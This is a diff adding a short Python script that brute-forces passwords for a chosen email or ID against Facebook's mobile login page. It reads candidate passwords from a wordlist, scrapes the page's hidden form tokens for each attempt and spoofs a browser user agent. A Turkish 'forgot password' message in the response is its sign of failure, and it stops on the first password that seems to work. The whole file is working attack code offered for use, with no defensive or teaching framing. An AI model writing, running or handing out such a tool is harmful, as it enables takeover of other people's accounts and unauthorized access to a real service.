@@ -1,0 +1,31 @@
+import requests
+from bs4 import BeautifulSoup
+
+Email = input("[+] Target Email Adress / ID>> ") 
+Patch = input("[+] Wordlist Patch>> ") 
+File = open(Patch, "r") 
+
+for Password in File: 
+    Password = Password.strip() 
+
+    Payload = {
+        "email":Email,
+        "pass":Password,
+        "login":"Giriş+Yap"
+               }
+    Url = "https://m.facebook.com/login/"
+    R = requests.get(Url)
+    Soup = BeautifulSoup(R.content, "html5lib") 
+    Agent = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0"} 
+    Payload["lsd"] = Soup.find(attrs={"name":"lsd"})["value"]
+    Payload["jazoest"] = Soup.find(attrs={"name":"jazoest"})["value"]
+    Payload["m_ts"] = Soup.find(attrs={"name":"m_ts"})["value"]
+    Payload["li"] = Soup.find(attrs={"name":"li"})["value"]
+    Payload["try_number"] = Soup.find(attrs={"name":"try_number"})["value"]
+    Payload["unrecognized_tries"] = Soup.find(attrs={"name":"unrecognized_tries"})["value"]
+    R = requests.post(Url,data=Payload, headers=Agent)
+    if "Şifreni mi Unuttun?" in R.text: 
+        print("[-] Password Not Found>> "+Password)
+    else:
+        print("[+] Password Found>> "+Password)
+        break
